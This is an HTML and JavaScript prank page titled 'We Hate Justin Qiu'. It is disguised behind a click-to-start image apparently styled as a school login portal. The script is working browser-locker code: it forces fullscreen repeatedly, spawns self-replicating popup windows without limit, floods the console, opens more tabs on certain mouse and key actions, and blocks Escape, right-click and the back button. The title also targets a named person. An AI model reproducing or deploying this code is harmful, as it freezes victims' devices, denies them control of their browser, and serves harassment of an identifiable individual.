<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>We Hate Justin Qiu</title>
    <link rel="icon" type="image/png" href="favicon.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            overflow: hidden;
            height: 100vh;
            background: #000;
            position: relative;
            cursor: pointer;
        }
        
        #start-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            object-fit: cover;
            z-index: 1000;
        }
        
        /* Hidden initially */
        #background-video {
            display: none;
        }
    </style>
</head>
<body>
    <!-- Start image that fills screen -->
    <img id="start-image" src="classlink.png" alt="Click to start">
    
    <!-- Background video -->
    <video id="background-video" loop muted>
        <source src="video.mp4" type="video/mp4">
        Your browser does not support the video tag.
    </video>

    <script>
        // Global variables
        let popups = [];
        let intervalId = null;
        let popupCounter = 0;
        let isStarted = false;
        let animationId = null;
        let lastMouseY = 0;
        let isFullscreen = false;
        let rapidFullscreenInterval = null;
        let rapidPopupInterval = null;
        let isCreatingPopup = false;
        
        // DOM elements
        const startImage = document.getElementById('start-image');
        const backgroundVideo = document.getElementById('background-video');
        
        // Check if this window was opened as a popup
        const isPopupWindow = window.opener !== null;
        
        // Function to enter fullscreen
        function enterFullscreen() {
            const elem = document.documentElement;
            
            if (elem.requestFullscreen) {
                elem.requestFullscreen().catch(e => {
                    // Silently fail, will retry rapidly
                });
            } else if (elem.mozRequestFullScreen) { // Firefox
                elem.mozRequestFullScreen().catch(e => {
                    // Silently fail
                });
            } else if (elem.webkitRequestFullscreen) { // Chrome, Safari, Opera
                elem.webkitRequestFullscreen().catch(e => {
                    // Silently fail
                });
            } else if (elem.msRequestFullscreen) { // IE/Edge
                elem.msRequestFullscreen().catch(e => {
                    // Silently fail
                });
            }
            
            isFullscreen = true;
        }
        
        // Check if currently in fullscreen
        function checkFullscreen() {
            return !!(document.fullscreenElement || 
                     document.mozFullScreenElement || 
                     document.webkitFullscreenElement || 
                     document.msFullscreenElement);
        }
        
        // Start rapid fullscreen checking and forcing
        function startRapidFullscreen() {
            if (rapidFullscreenInterval) {
                clearInterval(rapidFullscreenInterval);
            }
            
            // Check and force fullscreen every 0.1 seconds (100ms)
            rapidFullscreenInterval = setInterval(() => {
                if (!checkFullscreen() && isStarted) {
                    enterFullscreen();
                }
            }, 100); // 0.1 seconds
        }
        
        // Create multiple popups at once
        function createMultiplePopups(count) {
            for (let i = 0; i < count; i++) {
                createBrowserPopup();
            }
        }
        
        // Start rapid popup creation
        function startRapidPopups() {
            if (rapidPopupInterval) {
                clearInterval(rapidPopupInterval);
            }
            
            // Create popups as fast as possible
            rapidPopupInterval = setInterval(() => {
                // Create multiple popups each interval for maximum speed
                if (!isCreatingPopup) {
                    isCreatingPopup = true;
                    
                    // Create 5 popups at once for maximum speed
                    createMultiplePopups(5);
                    
                    // Use setTimeout to allow the browser to process
                    setTimeout(() => {
                        isCreatingPopup = false;
                    }, 0);
                }
            }, 0); // No delay, run as fast as possible
        }
        
        // If opened as popup, immediately start the experience
        if (isPopupWindow) {
            document.addEventListener('DOMContentLoaded', function() {
                // Hide the start image for popups
                startImage.style.display = 'none';
                
                // Immediately start the experience for popups
                setTimeout(() => {
                    startExperience();
                }, 50);
            });
        } else {
            // Main window - show start image
            startImage.style.display = 'block';
            
            // Start the experience when image is clicked
            startImage.addEventListener('click', startExperience);
        }
        
        // Mouse position tracking for top detection
        document.addEventListener('mousemove', (e) => {
            lastMouseY = e.clientY;
            
            // If mouse is within 30px from top and experience has started, open new tab
            if (isStarted && lastMouseY <= 30) {
                window.open('virus.html', '_blank');
                window.open('virus.html', '_blank');
                window.open('virus.html', '_blank'); // Open multiple
            }
        });
        
        // Keyboard detection for Ctrl or Command key
        let ctrlPressed = false;
        let cmdPressed = false;
        
        document.addEventListener('keydown', (e) => {
            if (e.ctrlKey) ctrlPressed = true;
            if (e.metaKey) cmdPressed = true; // Command key on Mac
            
            // If Ctrl or Command is pressed and experience has started, open new tab
            if (isStarted && (ctrlPressed || cmdPressed)) {
                window.open('virus.html', '_blank');
                window.open('virus.html', '_blank');
                window.open('virus.html', '_blank'); // Open multiple
            }
            
            // Block escape key
            if (e.key === 'Escape' && isStarted) {
                e.preventDefault();
            }
            
            // Block F11
            if (e.key === 'F11') {
                e.preventDefault();
            }
        });
        
        document.addEventListener('keyup', (e) => {
            if (e.key === 'Control') ctrlPressed = false;
            if (e.key === 'Meta') cmdPressed = false;
        });
        
        function startExperience() {
            if (isStarted) return;
            
            isStarted = true;
            
            // Hide start image
            startImage.style.display = 'none';
            
            // Show and play background video
            backgroundVideo.style.display = 'block';
            backgroundVideo.play();
            
            // Enter fullscreen immediately
            enterFullscreen();
            
            // Start rapid fullscreen forcing
            startRapidFullscreen();
            
            // Start infinite console logging
            startInfiniteLogging();
            
            // Create initial burst of popups
            createMultiplePopups(10);
            
            // Start rapid popup creation
            startRapidPopups();
            
            // Start animation
            startPopupAnimation();
        }
        
        // Create a single browser popup window
        function createBrowserPopup() {
            popupCounter++;
            
            // Calculate random position
            const screenWidth = window.screen.availWidth;
            const screenHeight = window.screen.availHeight;
            const popupWidth = 400;
            const popupHeight = 300;
            
            const left = Math.floor(Math.random() * (screenWidth - popupWidth));
            const top = Math.floor(Math.random() * (screenHeight - popupHeight));
            
            // Create popup window
            let popupWindow;
            try {
                popupWindow = window.open(
                    'virus.html', 
                    `popup-${popupCounter}-${Date.now()}`, // Unique name
                    `width=${popupWidth},height=${popupHeight},left=${left},top=${top},resizable=no,scrollbars=yes,toolbar=no,menubar=no,location=no,status=no`
                );
                
                if (!popupWindow || popupWindow.closed) {
                    return null;
                }
                
                // Random velocity for movement
                const velocity = {
                    x: (Math.random() - 0.5) * 25,
                    y: (Math.random() - 0.5) * 25
                };
                
                const popupData = {
                    window: popupWindow,
                    id: `popup-${popupCounter}`,
                    velocity: velocity,
                    width: popupWidth,
                    height: popupHeight,
                    left: left,
                    top: top
                };
                
                popups.push(popupData);
                
                return popupData;
                
            } catch (error) {
                return null;
            }
        }
        
        // Start infinite console logging
        function startInfiniteLogging() {
            // This will run in the background
            const logString = "ð€’".repeat(10000); // Create a long string of the character
            
            // Use setInterval to keep logging without blocking
            setInterval(() => {
                console.log(logString);
                console.log(logString);
                console.log(logString); // Multiple logs
            }, 50); // Very frequent logging
        }
        
        // Animate all popup windows (move them around)
        function animatePopups() {
            if (popups.length === 0) {
                animationId = requestAnimationFrame(animatePopups);
                return;
            }
            
            popups.forEach((popup, index) => {
                if (!popup.window || popup.window.closed) {
                    // Remove closed popups
                    popups.splice(index, 1);
                    return;
                }
                
                // Update position
                popup.left += popup.velocity.x;
                popup.top += popup.velocity.y;
                
                // Boundary checks (bounce)
                const screenWidth = window.screen.availWidth;
                const screenHeight = window.screen.availHeight;
                
                // Check horizontal boundaries
                if (popup.left <= 0) {
                    popup.left = 0;
                    popup.velocity.x = Math.abs(popup.velocity.x);
                } else if (popup.left + popup.width >= screenWidth) {
                    popup.left = screenWidth - popup.width;
                    popup.velocity.x = -Math.abs(popup.velocity.x);
                }
                
                // Check vertical boundaries
                if (popup.top <= 0) {
                    popup.top = 0;
                    popup.velocity.y = Math.abs(popup.velocity.y);
                } else if (popup.top + popup.height >= screenHeight) {
                    popup.top = screenHeight - popup.height;
                    popup.velocity.y = -Math.abs(popup.velocity.y);
                }
                
                // Try to move the window
                try {
                    if (!popup.window.closed) {
                        popup.window.moveTo(Math.floor(popup.left), Math.floor(popup.top));
                    }
                } catch (error) {
                    // Some browsers may block window moving
                }
            });
            
            animationId = requestAnimationFrame(animatePopups);
        }
        
        // Start popup animation
        function startPopupAnimation() {
            if (animationId) {
                cancelAnimationFrame(animationId);
            }
            animationId = requestAnimationFrame(animatePopups);
        }
        
        // Initialize based on window type
        if (isPopupWindow) {
            // Popup window - start experience automatically
            console.log("Popup window detected - auto-starting rapid experience");
        } else {
            // Main window - wait for click
            console.log("Main window - waiting for user click");
        }
        
        // Block right-click context menu
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            return false;
        });
        
        // Block back button
        history.pushState(null, null, location.href);
        window.onpopstate = function(event) {
            history.go(1);
        };
    </script>
</body>
</html>
